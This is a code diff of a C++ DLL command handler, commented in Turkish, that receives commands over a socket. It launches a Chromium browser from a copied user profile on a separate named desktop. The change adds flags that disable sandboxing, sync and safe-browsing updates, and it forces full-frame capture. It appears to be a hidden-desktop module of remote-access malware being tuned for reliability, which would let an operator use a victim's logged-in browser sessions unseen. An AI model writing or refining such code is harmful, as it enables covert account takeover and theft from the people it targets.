@@ -1307,7 +1307,24 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     send_status("Tarayıcı başlatılıyor...");
 
-                    wstring args = L" --user-data-dir=\"" + destProfile + L"\" --no-sandbox --disable-gpu";
+                    // Modern Chromium tarayıcılar için görünürlüğü ve kararlılığı artıran bayraklar
+                    wstring args = L" --user-data-dir=\"" + destProfile + L"\""
+                                   L" --no-sandbox"
+                                   L" --disable-gpu"
+                                   L" --window-size=1280,720"
+                                   L" --window-position=0,0"
+                                   L" --no-first-run"
+                                   L" --no-default-browser-check"
+                                   L" --disable-background-networking"
+                                   L" --disable-sync"
+                                   L" --disable-translate"
+                                   L" --metrics-recording-only"
+                                   L" --safebrowsing-disable-auto-update"
+                                   L" --disable-setuid-sandbox"
+                                   L" --disable-infobars"
+                                   L" --disable-gpu-compositing"
+                                   L" --force-cpu-draw";
+
                     wstring fullCmd = L"\"" + exePath + L"\"" + args;
                     vector<wchar_t> cmdLine(fullCmd.begin(), fullCmd.end());
                     cmdLine.push_back(L'\0');
@@ -1316,11 +1333,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     STARTUPINFOW si = { sizeof(si) };
                     si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
                     si.dwFlags      = STARTF_USESHOWWINDOW;
-                    si.wShowWindow  = SW_SHOW;
+                    si.wShowWindow  = SW_SHOWNORMAL;
 
                     PROCESS_INFORMATION pi = { 0 };
                     if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
-                                       CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+                                       0, NULL, NULL, &si, &pi)) {
                         CloseHandle(pi.hProcess);
                         CloseHandle(pi.hThread);
                         g_forceFullFrame = true;
